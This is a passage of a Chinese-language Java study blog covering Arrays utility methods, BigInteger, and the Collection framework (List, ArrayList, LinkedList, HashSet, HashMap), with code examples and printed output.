class_">Person</span>(<span class="hljs-string">&quot;abc&quot;</span>,<span class="hljs-number">30</span>);<br>        Person umr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;umr&quot;</span>,<span class="hljs-number">23</span>);<br>        Person acd=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;acd&quot;</span>,<span class="hljs-number">40</span>);<br>        Person[] aaa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>[]&#123;abc,umr,acd&#125;;<br>        Arrays.sort(aaa, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>() &#123;<br>           <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br>                <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> ((Person)o1) .age -((Person)o2).age;<br>                <span class="hljs-keyword">return</span> i;<br>            &#125;<br>        &#125;);<br>        System.out.println(Arrays.toString(aaa));<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>        String name=<span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>            <span class="hljs-built_in">this</span>.name=name;<br>            <span class="hljs-built_in">this</span>.age=age;<br>        &#125;<br>        <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                    <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                    <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">//[Person&#123;name=&#x27;umr&#x27;, age=23&#125;, Person&#123;name=&#x27;abc&#x27;, age=30&#125;, Person&#123;name=&#x27;acd&#x27;, age=40&#125;]</span><br></code></pre></td></tr></table></figure><h2 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h2><p>Arrays.toString  返回数组的字符串形式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">Integer[] aa = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>[]&#123;<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;;<br>   Arrays.sort(aa, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>() &#123;<br>           <span class="hljs-meta">@Override</span><br>           <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br>               <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (Integer) o1 - (Integer) o2;<br>               <span class="hljs-keyword">return</span> i;<br>           &#125;<br>       &#125;);<br>   System.out.println(Arrays.toString(aa));<br>   <span class="hljs-comment">//[1, 2, 3, 4, 5, 6]</span><br></code></pre></td></tr></table></figure><p>Arrays.sort 自然排序和定制排序（数值排序、对象排序）</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">参考前面的 <span class="hljs-built_in">sort</span> 方法例子<br></code></pre></td></tr></table></figure><p>Arrays.copyOf  数组元素的复制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] aa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>&#125;;<br>   <span class="hljs-type">int</span>[] bb=Arrays.copyOf(aa,aa.length);<br>   bb[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>;<br>   System.out.println(Arrays.toString(bb));<br></code></pre></td></tr></table></figure><p> Arrays.aslist 数组转化为 List 集合</p><p>Arrays.fill  数组填充</p><p>Arrays.binarySearch 二分查找（有序数组）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] aa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>&#125;;<br><span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> Arrays.binarySearch(aa,<span class="hljs-number">11</span>);<br>        System.out.println(i);<br><span class="hljs-comment">// 10</span><br>前提：有序情况下<br><br>无序时，先排序<br><span class="hljs-type">int</span>[] aa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>&#125;;<br>Arrays.sort(aa);<br>    System.out.println(Arrays.toString(aa));<br>    <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> Arrays.binarySearch(aa,<span class="hljs-number">2</span>);<br>    System.out.println(i);<br><span class="hljs-comment">//[0, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14]</span><br><span class="hljs-comment">//2</span><br><br>找不到就返回负数，-(low+<span class="hljs-number">1</span>)，low 为原本出现的位置，比如查找 <span class="hljs-number">10</span>，返回 -<span class="hljs-number">11</span> <br></code></pre></td></tr></table></figure><p>System.arraycopy   复制数组</p><p>System. currentTimeMillens( )返回当前距离时间</p><h2 id="BigInteger"><a href="#BigInteger" class="headerlink" title="BigInteger"></a>BigInteger</h2><p>保存比较大的数</p><p>BigDecimal  保存精度更高的小数</p><ul><li>add  加</li><li>subtract 减</li><li>multiply 乘</li><li>divide 除</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">BigInteger bigInteger1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;111111111111111111111111111111111111111&quot;</span>);<br>BigInteger bigInteger2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;100&quot;</span>);<br><br>BigInteger add=bigInteger1.add(bigInteger2);<br>System.out.println(add);<br><br>BigInteger subtract=bigInteger1.subtract(bigInteger2);<br>System.out.println(subtract);<br><br>BigInteger multiply=bigInteger1.multiply(bigInteger2);<br>System.out.println(multiply);<br><br>BigInteger divide=bigInteger1.divide(bigInteger2);<br>System.out.println(divide);<br></code></pre></td></tr></table></figure><h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><h2 id="集合框架体系"><a href="#集合框架体系" class="headerlink" title="集合框架体系"></a>集合框架体系</h2><ul><li>主要是两组 Collection 和 Map （单列集合，双列集合）</li><li>Collection 接口有两个子接口 List、Set，其实现子类都是单列集合</li><li>Map 接口的实现子类是双列集合，存放的 K-V</li></ul><h2 id="Collection-接口"><a href="#Collection-接口" class="headerlink" title="Collection 接口"></a>Collection 接口</h2><ul><li><p>add 添加单个元素，都是Object ，基本数据类型加入的是包装类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Collection collection=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>  collection.add(<span class="hljs-number">100</span>);<br>  collection.add(<span class="hljs-string">&quot;java&quot;</span>);<br>  collection.add(<span class="hljs-literal">false</span>);<br>  collection.add(<span class="hljs-literal">null</span>);<br>  System.out.println(collection);<br></code></pre></td></tr></table></figure></li><li><p>remove 删除指定元素，List 的子类有重载，可以按 index 删除</p></li><li><p>contains 查找元素是否存在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">collection.contains(<span class="hljs-literal">false</span>);<br>   System.out.println(collection.contains(<span class="hljs-literal">false</span>));<br></code></pre></td></tr></table></figure></li><li><p>size 获取元素个数</p></li><li><p>isEmpty 判断是否为空</p></li><li><p>clear 清空</p></li><li><p>addAll 查找多个元素是否存在</p></li><li><p>removeAll 删除多个元素</p></li></ul><h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><ul><li>有序，可重复</li><li>void add ( int index,Object ele ) 在 index 位置插入 ele 元素</li><li>boolean addAll ( int index,Collection eles) 从 index 位置开始将 eles 中的所有元素添加进来</li><li>Object get ( int index) 获取指定 index 位置的元素</li><li>int indexOf（Object obj)返回 obj 在当前集合中最后一次出现的位置</li><li>Object remove ( int index) 移除指定 index 位置的元素，并返回此元素</li><li>Object set （ int index,Object ele )  设置指定 index 位置的元素为 ele，相当于替换</li><li>List sublist ( int fromIndex,int toIndex)  返回从 fromIndex 到 toIndex 位置的子集合</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">List</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>   list.add(<span class="hljs-string">&quot;javass&quot;</span>);<br>   list.add(<span class="hljs-string">&quot;urm&quot;</span>);<br>   list.add(<span class="hljs-string">&quot;rr&quot;</span>);<br>   list.add(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;java&quot;</span>);<br>       <br>   List list2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>   list2.add(<span class="hljs-string">&quot;javass2&quot;</span>);<br>   list2.add(<span class="hljs-string">&quot;urm2&quot;</span>);<br>   list2.add(<span class="hljs-string">&quot;rr2&quot;</span>);<br>   list.addAll(<span class="hljs-number">1</span>,list2);<br>   list.add(<span class="hljs-string">&quot;urm2&quot;</span>);<br>   list.add(<span class="hljs-string">&quot;urm&quot;</span>);<br>       <br>   System.out.println(list.get(<span class="hljs-number">4</span>));    <span class="hljs-comment">//urm</span><br>       <br>   System.out.println(list.indexOf(<span class="hljs-string">&quot;urm2&quot;</span>));       <span class="hljs-comment">//2</span><br>       <br>   System.out.println(list.lastIndexOf(<span class="hljs-string">&quot;urm&quot;</span>));        <span class="hljs-comment">//8</span><br>   list.remove(<span class="hljs-number">8</span>);<br>   list.set(<span class="hljs-number">7</span>,<span class="hljs-string">&quot;urm4&quot;</span>);<br>   System.out.println(list.subList(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>));      <span class="hljs-comment">//[javass2, urm2, rr2]</span><br>   System.out.println(list);   <span class="hljs-comment">//[javass, javass2, urm2, rr2, urm, java, rr, urm4]</span><br></code></pre></td></tr></table></figure><h2 id="List-遍历"><a href="#List-遍历" class="headerlink" title="List 遍历"></a>List 遍历</h2><ul><li>适用于所有实现子类</li></ul><p>迭代器遍历</p><ul><li><p>Iterator 对象为迭代器，用于遍历 Collection 集合的元素</p></li><li><p>实现 Collection 接口的集合类都有 iterator( ) 方法，返回一个迭代器</p></li><li><p>Iterator 结构</p></li><li><p>Iterator 仅用于遍历集合，Iterator 本身并不存放对象</p></li><li><p>快捷输入 itit</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">Iterator iterator=list.iterator();<br>    Object next=iterator.next();<br>    System.out.println(next);       <span class="hljs-comment">//javass</span><br>        <br>    Object next2=iterator.next();<br>    System.out.println(next2);          <span class="hljs-comment">//javass2</span><br>        <br>    System.out.println(list);   <span class="hljs-comment">//[javass, javass2, urm2, rr2, urm, java, rr, urm2, urm]</span><br><span class="hljs-comment">//相当于指针</span><br></code></pre></td></tr></table></figure></li></ul><p>增强 for 循环</p><ul><li>实际上还是迭代器遍历</li><li>快捷输入 iter&#x2F;xxx.for</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Object o : list) &#123;<br>   System.out.println(o);<br>&#125;<br>        <br><span class="hljs-comment">//javass</span><br>javass2<br>urm2<br>rr2<br>urm<br>java<br>rr<br>urm2<br>urm<br></code></pre></td></tr></table></figure><p>for 循环</p><ul><li>xxx.for</li><li>前提有索引</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;list.size();i++)&#123;<br>    System.out.println(list.get(i));<br>&#125;<br><span class="hljs-comment">//有索引</span><br></code></pre></td></tr></table></figure><h2 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h2><ul><li>由数组实现数据存储</li><li>Vector 和 ArrayList 基本相同，Vector 线程安全，ArrayList 执行效率高</li></ul><p>ArrayList 扩容机制</p><ul><li>有一个 Object 类型的数组 elementData，存放元素 transient Object [ ] elementData</li><li>指定大小构造器</li></ul><h2 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h2><ul><li>对象数组存放元素，protected Object [ ]  elementData</li><li>指定扩容个数        new Vector(10,3)</li></ul><h2 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h2><ul><li>双向链表，有两个属性 first 和 last 分别指向首节点和尾节点</li><li>每个节点（Node 对象）里面有 prev 、next、item三个属性，item 存放元素，prev 指向前一个节点，next 指向后一个节点</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java">   Node java= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;java&quot;</span>);<br>       Node rw=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;rw&quot;</span>);<br>       Node urm=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;urm&quot;</span>);<br>       java.next=rw;<br>       rw.next=urm;<br>       <br>       urm.prev=rw;<br>       rw.prev=java;<br>       <br>       Node first=java;<br>       Node last=urm;<br>       <br>       Node temp=first;<br>       <span class="hljs-keyword">while</span>(temp!=<span class="hljs-literal">null</span>)&#123;<br>           System.out.println(temp);<br>           temp=temp.next;<br>       &#125;<br>        <br>        temp=last;<br>        <span class="hljs-keyword">while</span>(temp!=<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(temp);<br>            temp=temp.prev;<br>        &#125;<br>    <br>    &#125;<br>   <br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span>&#123;<br>    <span class="hljs-keyword">public</span> Node prev;<br>    <span class="hljs-keyword">public</span> Node next;<br>    <span class="hljs-keyword">public</span> Object item;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Node</span><span class="hljs-params">(Object item)</span> &#123;<br>        <span class="hljs-built_in">this</span>.item = item;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Node&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;item=&quot;</span> + item +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//Node&#123;item=java&#125;</span><br>Node&#123;item=rw&#125;<br>Node&#123;item=urm&#125;<br>Node&#123;item=urm&#125;<br>Node&#123;item=rw&#125;<br>Node&#123;item=java&#125;<br></code></pre></td></tr></table></figure><h2 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h2><ul><li><p>无序，没有索引，但是输出顺序固定</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">HashSet hashSet=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br>    hashSet.add(<span class="hljs-string">&quot;java&quot;</span>);<br>    hashSet.add(<span class="hljs-string">&quot;abc&quot;</span>);<br>    hashSet.add(<span class="hljs-string">&quot;def&quot;</span>);<br>    hashSet.add(<span class="hljs-string">&quot;javsdv&quot;</span>);<br>    hashSet.add(<span class="hljs-string">&quot;rw&quot;</span>);<br>    System.out.println(hashSet);<br><span class="hljs-comment">//[java, abc, def, rw, javsdv]</span><br></code></pre></td></tr></table></figure></li><li><p>不允许重复元素，最多包含一个 null</p></li><li><p>Set 接口是 Collection 子接口，常用方法和 Collection 一样</p></li><li><p>Set 接口遍历方式</p><ul><li>迭代器遍历</li><li>增强 for 遍历</li><li>不能用索引来获取，无法使用普通 for 遍历</li></ul></li></ul><h2 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h2><ul><li><p>实际上是 HashMap</p></li><li><p>无序，取决于 hash 后，确定索引结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"> HashSet set=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br>    System.out.println(set.add(<span class="hljs-string">&quot;java&quot;</span>));<br>    System.out.println(set.add(<span class="hljs-string">&quot;abc&quot;</span>));<br>    System.out.println(set.add(<span class="hljs-string">&quot;def&quot;</span>));<br>    System.out.println(set.add(<span class="hljs-string">&quot;java&quot;</span>));<br>    System.out.println(set.add(<span class="hljs-literal">null</span>));<br>    set.remove(<span class="hljs-string">&quot;def&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;set&quot;</span>+set);<br><span class="hljs-comment">//true</span><br><span class="hljs-literal">true</span><br><span class="hljs-literal">true</span><br><span class="hljs-literal">false</span><br>truej<br>set[<span class="hljs-literal">null</span>, java, abc]<br></code></pre></td></tr></table></figure></li></ul><p><strong>add 进行的操作</strong></p><ul><li>HashMap 底层是（数组 + 链表 + 红黑树）</li><li>添加一个元素时，先得到 hash 值，然后转化为索引值</li><li>找到存储数据表 table ，看这个索引位置是否已经存放元素，没有就直接加入，有就调用 equals 比较，相同就放弃添加，不同就添加到最后</li><li>如果一条链表元素个数&gt;&#x3D;8,table &gt;&#x3D;64，进行树华</li><li>如果链表没达到 8 ，table 没到 64，先进行数组扩容</li><li>加入 HashMap 中的元素，是否相同由 HashCode 和 equals 方法决定</li></ul><h2 id="LinkedHashSet"><a href="#LinkedHashSet" class="headerlink" title="LinkedHashSet"></a>LinkedHashSet</h2><ul><li>不允许添加重复元素，是HashSet子类，底层是 LinkedHashMap</li><li>遍历顺序和添加顺序一致</li><li>存放元素方式和 HashSet 相同，在此基础上又维护了一个双向链表</li></ul><h2 id="Map-接口"><a href="#Map-接口" class="headerlink" title="Map 接口"></a>Map 接口</h2><ul><li>与 Collection 并列存在。用于保存具有映射关系的数据：Key - Value （双列集合）</li><li>key 和 value 可以是任何引用数据类型，会封装到 HashMap$Node 对象中</li><li>key 不能重复，key 一样时，新的值会替换旧的，value可以重复</li><li>key 可以为 null （只能一个），value 可以为 null (可以多个)</li><li>key 和 value 为单向一对一关系，通过指定 key 可以找到对应的 value</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">  Map hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    hashMap.put(<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-string">&quot;bb&quot;</span>);<br>    hashMap.put(<span class="hljs-string">&quot;pass&quot;</span>,<span class="hljs-string">&quot;word&quot;</span>);<br>    Integer integer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">100</span>);<br>    hashMap.put(integer,<span class="hljs-literal">null</span>);<br>        <br>    System.out.println(hashMap);<br><span class="hljs-comment">//&#123;100=null, pass=word, user=bb&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">Map hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    hashMap.put(<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-string">&quot;bb&quot;</span>);<br>    hashMap.put(<span class="hljs-string">&quot;pass&quot;</span>,<span class="hljs-string">&quot;word&quot;</span>);<br>    hashMap.put(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;me&quot;</span>);<br>    Integer integer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">100</span>);<br>    hashMap.put(integer,<span class="hljs-literal">null</span>);<br>    hashMap.remove(<span class="hljs-string">&quot;user&quot;</span>);<br>    System.out.println(hashMap.get(<span class="hljs-string">&quot;pass&quot;</span>));<br>    System.out.println(hashMap.size());<br>    System.out.println(hashMap.isEmpty());<br>    System.out.println(hashMap.containsKey(<span class="hljs-string">&quot;admin&quot;</span>));<br>    System.out.println(hashMap);<br><span class="hljs-comment">//word</span><br><span class="hljs-number">3</span><br><span class="hljs-literal">false</span><br><span class="hljs-literal">true</span><br>&#123;<span class="hljs-number">100</span>=<span class="hljs-literal">null</span>, pass=word, admin=me&#125;<br></code></pre></td></tr></table></figure><h2 id="HashMap-遍历"><a href="#HashMap-遍历" class="headerlink" title="HashMap 遍历"></a>HashMap 遍历</h2><ul><li><p>取出所有的 Key ，通过 key 获取 value</p><ul><li><p>加强 for循环</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Set keyset=hashMap.keySet();<br><span class="hljs-keyword">for</span>(Object key:keyset)&#123;<br>    System.out.println(key+<span class="hljs-string">&quot;-&quot;</span>+hashMap.get(key));<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>迭代器遍历</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Iterator iterator=set.iterator();<br><span class="hljs-keyword">while</span>(iterator.hasNext())&#123;<br>Object keyset=iterator.next();<br>System.out.println(keyset+<span class="hljs-string">&quot;-&quot;</span>+hashMap.get(keyset));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">Set</span> <span class="hljs-variable">keysset</span> <span class="hljs-operator">=</span>hashMap.keySet();<br> keysset.forEach(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Consumer</span>() &#123;<br>      <span class="hljs-meta">@Override</span><br>      <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(Object keyset)</span> &#123;<br>         System.out.println(keyset+<span class="hljs-string">&quot;-&quot;</span>+hashMap.get(keyset));<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure></li></ul></li><li><p>取出所有的 value</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Collection values=hashMap.values();<br><span class="hljs-keyword">for</span>(Object value:values)&#123;<br>      System.out.println(value);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>通过 EntrySet 来获取 K-V</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Set entrySet=hashMap.entrySet();<br> <span class="hljs-keyword">for</span> (Object keyset:entrySet)&#123;<br> Map.Entry entry=(Map.Entry)keyset;<br>        System.out.println(entry.getKey()+<span class="hljs-string">&quot;-&quot;</span>+entry.getValue());<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>Key-Value 存放</p></li><li><p>keySet 和 values 返回类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 